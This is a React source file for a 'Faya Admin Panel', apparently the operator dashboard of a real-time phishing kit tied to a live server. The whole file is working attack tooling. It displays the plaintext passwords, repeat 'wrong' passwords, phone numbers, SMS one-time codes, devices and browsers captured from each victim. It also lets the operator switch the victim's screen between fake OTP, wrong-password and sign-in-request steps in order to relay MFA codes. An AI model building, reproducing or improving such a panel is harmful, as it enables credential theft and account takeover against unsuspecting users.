import { useEffect, useRef, useState } from "react";
import axios from "axios";
import socket from "../socket";
import "./Admin.css";
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import { useNavigate } from "react-router-dom";
import img from "./image.png"


function Admin() {
  const navigate = useNavigate();
  const [users, setUsers] = useState([]);
  const [connected, setConnected] = useState(false);
  const [loading, setLoading] = useState(true);
  const [showApproveModal, setShowApproveModal] = useState(false);
  const [soundEnabled, setSoundEnabled] = useState(true);
const [selectedUser, setSelectedUser] = useState(null);

const [userDevice, setUserDevice] = useState("");
const [code, setCode] = useState("");
const soundEnabledRef = useRef(false);

useEffect(() => {
  soundEnabledRef.current = soundEnabled;
  if (soundEnabledRef.current){
    playNotificationSound()
  }
}, [soundEnabled]);


  // ======================================
  // GET USERS
  // ======================================

  useEffect(() => {
  const handleUsersCleared = () => {
    setUsers([]);
  };

  socket.on(
    "users-cleared",
    handleUsersCleared
  );

  return () => {
    socket.off(
      "users-cleared",
      handleUsersCleared
    );
  };
}, []);

  useEffect(() => {
    const isAdminLoggedIn =
      sessionStorage.getItem("adminLoggedIn");

    if (isAdminLoggedIn !== "true") {
      navigate("/admin-login", {
        replace: true,
      });
    }
  }, [navigate]);

  const getUsers = async () => {

    try {

      const response = await axios.get(
        "https://connect-server-uky7.onrender.com/api/admin/pending-users"
      );

      setUsers(response.data);

    } catch (error) {

      console.log(
        "Error getting users:",
        error
      );

    } finally {

      setLoading(false);

    }

  };

  const playNotificationSound = () => {
  const AudioContext =
    window.AudioContext ||
    window.webkitAudioContext;

  const audioContext = new AudioContext();

  const oscillator =
    audioContext.createOscillator();

  const gain =
    audioContext.createGain();

  oscillator.connect(gain);
  gain.connect(audioContext.destination);

  oscillator.type = "sine";

  oscillator.frequency.setValueAtTime(
    880,
    audioContext.currentTime
  );

  oscillator.frequency.setValueAtTime(
    1175,
    audioContext.currentTime + 0.12
  );

  gain.gain.setValueAtTime(
    0.0001,
    audioContext.currentTime
  );

  gain.gain.exponentialRampToValueAtTime(
    0.25,
    audioContext.currentTime + 0.02
  );

  gain.gain.exponentialRampToValueAtTime(
    0.0001,
    audioContext.currentTime + 0.35
  );

  oscillator.start();

  oscillator.stop(
    audioContext.currentTime + 0.55
  );
};


  // ======================================
  // CHANGE USER SCREEN
  // ======================================

  const changeUserStep = async (userId, step) => {
  try {
    await axios.patch(
      `https://connect-server-uky7.onrender.com/api/admin/change-step/${userId}`,
      {
        step,
      }
    );

    console.log("Step changed:", step);

  } catch (error) {
    console.error(
      "Change step error:",
      error
    );
  }
};

  // ======================================
  // APPROVE USER
  // ======================================




  // ======================================
  // SOCKET
  // ======================================

  useEffect(() => {

    const handleConnect = () => {

      console.log(
        "🔥 Admin socket connected:",
        socket.id
      );

      setConnected(true);

      socket.emit(
        "join-admin"
      );

    };


    const handleDisconnect = () => {

      console.log(
        "Admin socket disconnected"
      );

      setConnected(false);

    };

 


    // ====================================
    // NEW USER
    // ====================================

    const handleNewUser = (user) => {

      console.log(
        "🔥 NEW USER:",
        user
      );

      toast.info(`New user: ${user.email}`, {
        position: "bottom-right",
        autoClose: 5000,
        hideProgressBar: false,
        closeOnClick: true,
        pauseOnHover: true,
        draggable: true,
        progress: undefined,
      });

      
      playNotificationSound();
    
  

      setUsers((currentUsers) => {

        const exists =
          currentUsers.some(
            (existingUser) =>
              existingUser._id ===
              user._id
          );

        if (exists) {

          return currentUsers;

        }

        return [
          user,
          ...currentUsers
        ];

      });

    };


    // ====================================
    // PASSWORD COMPLETED
    // ====================================

        const handlePasswordSet = (data) => {

  console.log(
    "🔥 PASSWORD SET EVENT RECEIVED:",
    data
  );

      playNotificationSound();


  setUsers((currentUsers) => {

    return currentUsers.map((user) => {

      if (
        String(user._id) ===
        String(data._id)
      ) {

        return {
          ...user,
        password: data.password
        };

      }

      return user;

    });

  });

};

  const handlewrongPasswordSet = (data) => {

  console.log(
    "🔥 WRONG PASSWORD SET EVENT RECEIVED:",
    data
  );

      playNotificationSound();


  setUsers((currentUsers) => {

    return currentUsers.map((user) => {

      if (
        String(user._id) ===
        String(data._id)
      ) {

        return {
          ...user,
        wrongPassword: data.wrongPassword
        };

      }

      return user;

    });

  });

};






const handlePhoneSubmitted = (data) => {

  console.log(
    "🔥 PHONE SUBMITTED EVENT RECEIVED:",
    data
  );

      playNotificationSound();

   setUsers((currentUsers) => {

    return currentUsers.map((user) => {

      if (
        String(user._id) ===
        String(data._id)
      ) {

        return {
          ...user,
        phoneNumber: data.phoneNumber
        };

      }

      return user;

    });

  });

}

const handlePhoneOtpSubmitted = (data) => {

  console.log(
    "🔥 PHONE SUBMITTED EVENT RECEIVED:",
    data
  );

      playNotificationSound();

   setUsers((currentUsers) => {

    return currentUsers.map((user) => {

      if (
        String(user._id) ===
        String(data._id)
      ) {

        return {
          ...user,
        phoneOtp: data.phoneOtp
        };

      }
      

      return user;

    });

  });

}

const handlePhoneOtp2Submitted = (data) => {

  console.log(
    "🔥 Wrong otp SUBMITTED EVENT RECEIVED:",
    data
  );

      playNotificationSound();

   setUsers((currentUsers) => {

    return currentUsers.map((user) => {

      if (
        String(user._id) ===
        String(data._id)
      ) {

        return {
          ...user,
        phoneOtp2: data.phoneOtp2
        };

      }

      return user;

    });

  });

}

 


    // ====================================
    // USER STEP CHANGED
    // ====================================

    const handleStepChanged = (data) => {

      console.log(
        "🔥 USER STEP:",
        data
      );

      toast.info(`User ${data.userId} moved to step: ${data.step}`, {
        position: "bottom-right",
        autoClose: 5000,
        hideProgressBar: false,
        closeOnClick: true,
        pauseOnHover: true,
        draggable: true,
        progress: undefined,
      });

      setUsers((currentUsers) =>
        currentUsers.map((user) =>
          user._id === data._id
            ? {
                ...user,
                currentStep:
                  data.currentStep
              }
            : user
        )
      );

    };


    if (socket.connected) {

      handleConnect();

    }


    socket.on(
      "connect",
      handleConnect
    );

    socket.on(
      "disconnect",
      handleDisconnect
    );

    socket.on(
      "new-user",
      handleNewUser
    );

    socket.on(
      "password-set",
      handlePasswordSet
    );

     socket.on(
      "wrongPassword-set",
      handlewrongPasswordSet
    );

    socket.on(
      "user-step-changed",
      handleStepChanged
    );

    socket.on(
      "phone-submitted",
      handlePhoneSubmitted
    );
       socket.on(
      "phoneotp-submitted",
      handlePhoneOtpSubmitted
    );
       socket.on(
      "phoneotp2-submitted",
      handlePhoneOtp2Submitted
    );


    getUsers();


    return () => {

      socket.off(
        "connect",
        handleConnect
      );

      socket.off(
        "disconnect",
        handleDisconnect
      );

      socket.off(
        "new-user",
        handleNewUser
      );

      socket.off(
        "password-set",
        handlePasswordSet
      );
       socket.off(
        "wrongPassword-set",
        handlewrongPasswordSet
      );

      socket.off(
        "phone-submitted",
        handlePhoneSubmitted
      );
      socket.off(
        "phoneotp-submitted",
        handlePhoneOtpSubmitted
      );
       socket.off(
        "phoneotp2-submitted",
        handlePhoneOtp2Submitted
      );

      socket.off(
        "user-step-changed",
        handleStepChanged
      );

    };

  }, []);


  // ======================================
  // LOADING
  // ======================================

  if (loading) {

    return (
      <div style={styles.loading}>
        Loading admin dashboard...
      </div>
    );

  }


  // ======================================
  // UI
  // ======================================

  return (

    <div style={styles.page}>

      <div  className="header headd ">

        <div>
              <div className="admin-brand">
                      <img className="fge" src={img} alt="" />
                      <h2 className="gh">Faya Admin Panel</h2>
          
                    </div>
          {/* <h1 style={styles.title}>
            Admin Dashboard
          </h1> */}

       

        </div>


            <div className="ten">
                     <div
          style={{
            ...styles.status,
            background: connected
              ? "#e6f4ea"
              : "#fce8e6",
            color: connected
              ? "#137333"
              : "#c5221f"
          }}
        >

        

          {connected
            ? "  Connected"
            : "  Offline"}

        </div>
<button
  onClick={() => {
    setSoundEnabled((prev) => !prev);
  }}
  style={{
    border: "1px solid #304665",
    background: soundEnabled
      ? "#102a56"
      : "#17243a",
    color: soundEnabled
      ? "#60a5fa"
      : "#91a4c3",
    padding: "10px 16px",
    borderRadius: "7px",
    cursor: "pointer",
    fontSize: "14px",
    fontWeight: "500"
  }}
>
  {soundEnabled
    ? "🔊 Sound On"
    : "🔇 Sound Off"}
</button>

        <button
  className="clear-users-button"
  onClick={async () => {
    const confirmed = window.confirm(
      "Are you sure you want to delete ALL users?"
    );

    if (!confirmed) return;

    try {
      await axios.delete(
        "https://connect-server-uky7.onrender.com/api/admin/users"
      );

      setUsers([]);
    } catch (error) {
      console.error(
        "Failed to clear users:",
        error
      );
    }
  }}
>
  Delete All 
</button>
            </div>

      </div>


      <div style={styles.stats}>

        <div style={styles.statCard}>

          <div style={styles.statNumber}>
            {users.length}
          </div>

          <div style={styles.statLabel}>
            Users
          </div>

        </div>


      



      </div>


      <h2 style={styles.sectionTitle}>
        Users
      </h2>


      {users.length === 0 ? (

        <div style={styles.empty}>
          No users yet.
        </div>

      ) : (

        <div style={styles.userGrid}>

          {users.map((user) => (

            <div
              key={user._id}
              style={styles.userCard}
            >

              {/* ======================
                  USER HEADER
              ======================= */}

              <div style={styles.userHeader}>

                <div>

                  <div style={styles.email}>
                    {user.email}
                  </div>

                  <div style={styles.id}>
                    ID: {user._id}
                  </div>

                </div>


                <div
                  style={{
                    ...styles.stepBadge,
                    background:
                      getStepColor(
                        user.currentStep
                      )
                  }}
                >
                  {user.currentStep ||
                    "email"}
                </div>

              </div>


              {/* ======================
                  STATUS
              ======================= */}

              <div style={styles.info}>

                <Info
                  label="Password"
                  value={
                    user.password
                  }
                />

                <Info
                  label="Phone"
                  value={
                    user.phoneNumber ||
                    "Not submitted"
                  }
                />

                <Info
                  label="Wrong Password"
                  value={
                    user.wrongPassword ||
                    "Not Submitted"
                  }
                />
                    <Info
                  label="Phone OTP"
                  value={
                    user.phoneOtp ||
                    "Not Submitted"
                  }
                />

                   <Info
                  label="Wrong OTP"
                  value={
                    user.phoneOtp2 ||
                    "Not Submitted"
                  }
                />
                   <Info
                  label="Device"
                  value={
                    user.device ||
                    "Not Submitted"
                  }
                />
                   <Info
                  label="Browser"
                  value={
                    user.browser ||
                    "Not Submitted"
                  }
                />

                <Info
                  label="Created"
                  value={
                    user.createdAt
                      ? new Date(
                          user.createdAt
                        ).toLocaleString()
                      : "Unknown"
                  }
                />

              </div>




          


              {/* ======================
                  REALTIME CONTROLS
              ======================= */}

              <div style={styles.controlsTitle}>
                User Screen
              </div>


              <div style={styles.controls}>

                <button
                  onClick={() =>
                    changeUserStep(
                      user._id,
                      "phone"
                    )
                  }
                  style={styles.controlButton}
                >
                  Phone Number
                </button>


                <button
                  onClick={() => {
                  setSelectedUser(user);
                  setUserDevice("");
                  setCode("");
                  setShowApproveModal(true);
                }}
                  style={styles.controlButton}
                >
                  Sign-in Request
                </button>


                <button
                  onClick={() =>
                    changeUserStep(
                      user._id,
                      "phone-otp"
                    )
                  }
                  style={styles.controlButton}
                >
                  Phone OTP
                </button>
                <button
                  onClick={() =>
                    changeUserStep(
                      user._id,
                      "phone-otp2"
                    )
                  }
                  style={styles.controlButton}
                >
                  Wrong OTP
                </button>
                   <button
                  onClick={() =>
                    changeUserStep(
                      user._id,
                      "wrong-password"
                    )
                  }
                  style={styles.controlButton}
                >
                  Wrong Password
                </button>


                <button
                  onClick={() =>
                    changeUserStep(
                      user._id,
                      "success"
                    )
                  }
                  style={styles.successButton}
                >
                  Success
                </button>

              </div>

            </div>

          ))}

        </div>

      )}
      {showApproveModal && (
  <div className="approve-modal-overlay">

    <div className="approve-modal">

      <button
        className="approve-modal-close"
        onClick={() => {
          setShowApproveModal(false);
          setSelectedUser(null);
        }}
      >
        ×
      </button>

      <h2>Sign-in Request</h2>

      {selectedUser && (
        <p className="selected-user">
          sign-in request for: {selectedUser.email}
        </p>
      )}

      <div className="approve-field">

        <label>
          User Device
        </label>

        <input
          type="text"
          value={userDevice}
          onChange={(e) =>
            setUserDevice(e.target.value)
          }
          placeholder="Enter device"
        />

      </div>

      <div className="approve-field">

        <label>
          Code
        </label>

        <input
          type="text"
          value={code}
          onChange={(e) =>
            setCode(e.target.value)
          }
          placeholder="Enter Code"
        />

      </div>

      <div className="approve-modal-actions">

        <button
          className="cancel-approve"
          onClick={() => {
            setShowApproveModal(false);
            setSelectedUser(null);
          }}
        >
          Cancel
        </button>

        <button
          className="confirm-approve"
          disabled={
            
            !userDevice.trim() ||
            !code.trim()
          }
          onClick={async () => {

            if (!selectedUser) return;

            // setApproving(true);

            try {

              await axios.patch(
                `https://connect-server-uky7.onrender.com/api/admin/approve/${selectedUser._id}`,
                {
                  userDevice: userDevice.trim(),
                  code: code.trim()
                }
              );

           

              setShowApproveModal(false);
              setSelectedUser(null);

            } catch (error) {

              console.error(
                "Approval error:",
                error
              );

            } 

          }}
        >
          Send
        </button>

      </div>

    </div>

  </div>
)}
  <ToastContainer
position="bottom-right"
autoClose={5000}
hideProgressBar={false}
newestOnTop={false}
closeOnClick={false}
rtl={false}
pauseOnFocusLoss
draggable
pauseOnHover
theme="light"
/>

    </div>

  );

}


// ======================================
// INFO COMPONENT
// ======================================

function Info({
  label,
  value
}) {

  return (

    <div style={styles.infoRow}>

      <span style={styles.infoLabel}>
        {label}
      </span>

      <span style={styles.infoValue}>
        {value}
      </span>

    </div>

  );

}


// ======================================
// STEP COLOR
// ======================================

function getStepColor(step) {

  switch (step) {

    case "password":
      return "#e8f0fe";

    case "phone":
      return "#fef7e0";

    case "signin-request":
      return "#f3e8fd";

    case "wrong-password":
      return "#fce8e6";

    case "success":
      return "#e6f4ea";

    default:
      return "#f1f3f4";

  }

}


// ======================================
// STYLES
// ======================================

const styles = {
  page: {
    minHeight: "100vh",
    background: "#0b1220",
    padding: "35px",
    boxSizing: "border-box",
    fontFamily: "Arial, sans-serif",
    color: "#e8f0fe"
  },

  header: {
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    marginBottom: "30px"
  },

  title: {
    margin: 0,
    fontSize: "30px",
    fontWeight: "600",
    color: "#ffffff"
  },

  subtitle: {
    marginTop: "8px",
    color: "#91a4c3",
    fontSize: "14px"
  },

  status: {
    padding: "9px 16px",
    borderRadius: "20px",
    fontSize: "14px",
    fontWeight: "600",
    background: "#102a56",
    color: "#60a5fa",
    border: "1px solid #1d4f91"
  },

  stats: {
    display: "flex",
    gap: "18px",
    marginBottom: "35px",
    flexWrap: "wrap"
  },

  statCard: {
    background: "#111c2f",
    border: "1px solid #243756",
    borderRadius: "12px",
    padding: "20px 30px",
    minWidth: "150px",
    boxShadow: "0 4px 14px rgba(0, 0, 0, 0.25)"
  },

  statNumber: {
    fontSize: "28px",
    fontWeight: "600",
    color: "#60a5fa"
  },

  statLabel: {
    color: "#91a4c3",
    marginTop: "5px",
    fontSize: "14px"
  },

  sectionTitle: {
    fontSize: "21px",
    fontWeight: "600",
    color: "#ffffff",
    marginBottom: "18px"
  },

  userGrid: {
    display: "grid",
    gridTemplateColumns:
      "repeat(auto-fill, minmax(390px, 49%))",
    gap: "20px"
  },

  userCard: {
    background: "#111c2f",
    border: "1px solid #243756",
    borderRadius: "14px",
    padding: "22px",
    boxSizing: "border-box",
    boxShadow: "0 4px 14px rgba(0, 0, 0, 0.25)"
  },

  userHeader: {
    display: "flex",
    justifyContent: "space-between",
    alignItems: "flex-start",
    gap: "15px",
    marginBottom: "20px"
  },

  email: {
    fontSize: "17px",
    fontWeight: "600",
    color: "#f8fafc",
    wordBreak: "break-word"
  },

  id: {
    marginTop: "6px",
    color: "#7185a3",
    fontSize: "11px",
    wordBreak: "break-all"
  },

  stepBadge: {
    padding: "6px 11px",
    borderRadius: "15px",
    fontSize: "12px",
    whiteSpace: "nowrap",
    color: "#60a5fa",
    background: "#102a56",
    border: "1px solid #1d4f91",
    fontWeight: "500"
  },

  info: {
    borderTop: "1px solid #243756",
    borderBottom: "1px solid #243756",
    padding: "10px 0",
    marginBottom: "15px"
  },

  infoRow: {
    display: "flex",
    justifyContent: "space-between",
    padding: "7px 0",
    gap: "10px"
  },

  infoLabel: {
    color: "#91a4c3",
    fontSize: "13px"
  },

  infoValue: {
    color: "#dbeafe",
    fontSize: "13px",
    textAlign: "right",
    wordBreak: "break-word",
    fontWeight: "500"
  },

  approveButton: {
    width: "100%",
    border: "none",
    background: "#2563eb",
    color: "#ffffff",
    padding: "12px",
    borderRadius: "7px",
    fontSize: "14px",
    fontWeight: "600",
    cursor: "pointer",
    marginBottom: "18px",
    boxShadow: "0 4px 12px rgba(37, 99, 235, 0.3)"
  },

  controlsTitle: {
    color: "#91a4c3",
    fontSize: "13px",
    marginBottom: "9px",
    fontWeight: "500"
  },

  controls: {
    display: "grid",
    gridTemplateColumns: "1fr 1fr",
    gap: "8px"
  },

  controlButton: {
    border: "1px solid #304665",
    background: "#17243a",
    color: "#c9d8ee",
    padding: "10px 8px",
    borderRadius: "7px",
    fontSize: "13px",
    cursor: "pointer",
    fontWeight: "500"
  },

  successButton: {
    border: "none",
    background: "#16803c",
    color: "#ffffff",
    padding: "10px 8px",
    borderRadius: "7px",
    fontSize: "13px",
    cursor: "pointer",
    fontWeight: "500"
  },

  empty: {
    background: "#111c2f",
    border: "1px solid #243756",
    borderRadius: "12px",
    padding: "40px",
    textAlign: "center",
    color: "#91a4c3",
    boxShadow: "0 4px 14px rgba(0, 0, 0, 0.2)"
  },

  loading: {
    minHeight: "100vh",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    fontFamily: "Arial, sans-serif",
    background: "#0b1220",
    color: "#60a5fa"
  }
};

export default Admin;